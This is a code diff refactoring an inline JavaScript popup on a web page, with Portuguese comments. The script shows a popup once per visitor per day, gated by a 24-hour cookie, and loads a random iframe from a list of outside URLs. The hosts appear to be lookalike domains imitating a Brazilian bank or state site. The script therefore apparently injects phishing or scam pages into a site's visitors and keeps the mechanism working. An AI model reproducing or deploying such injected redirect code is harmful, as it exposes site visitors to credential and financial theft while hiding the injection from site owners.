@@ -4,31 +4,33 @@
 </div>
 
 <script>
-  // Função para definir cookie por X horas
+  // Função para definir cookie com duração em horas
   function setCookie(name, value, hours) {
     const date = new Date();
-    date.setTime(date.getTime() + (hours * 60 * 60 * 1000)); // converter horas para milissegundos
+    date.setTime(date.getTime() + (hours * 60 * 60 * 1000)); // horas para milissegundos
     const expires = "expires=" + date.toUTCString();
     document.cookie = name + "=" + value + ";" + expires + ";path=/";
   }
 
-  // Função para obter valor de cookie
+  // Função para obter cookie
   function getCookie(name) {
-    const value = "; " + document.cookie;
-    const parts = value.split("; " + name + "=");
-    if (parts.length === 2) return parts.pop().split(";").shift();
+    const nameEQ = name + "=";
+    const ca = document.cookie.split(';');
+    for (let i = 0; i < ca.length; i++) {
+      let c = ca[i];
+      while (c.charAt(0) == ' ') c = c.substring(1, c.length);
+      if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
+    }
     return null;
   }
 
-  // Verificar se cookie já existe
+  // Verifica se o cookie já existe
   if (!getCookie("popupVisitado")) {
     // Mostrar popup
-    document.getElementById('popup').style.display = "block";
+    const popup = document.getElementById('popup');
+    popup.style.display = "block";
 
-    // Definir cookie por 24 horas
-    setCookie("popupVisitado", "sim", 24);
-
-    // Lista de iframes permitidos
+    // Escolher iframe aleatório
     const iframes = [
       "https://geocredibnkvitoria.com/",
       "https://espiritosantoes-com-brprincipal.pages.dev/vps01",
@@ -45,9 +47,10 @@
       "https://espiritosantoes-com-brprincipal.pages.dev/12"
     ];
 
-    // Escolher aleatoriamente
-    const iframeIndex = Math.floor(Math.random() * iframes.length);
-    const iframeUrl = iframes[iframeIndex];
+    const iframeUrl = iframes[Math.floor(Math.random() * iframes.length)];
     document.getElementById('iframe').src = iframeUrl;
+
+    // Criar cookie APÓS exibição
+    setCookie("popupVisitado", "sim", 24); // Cookie por 24 horas
   }
 </script>
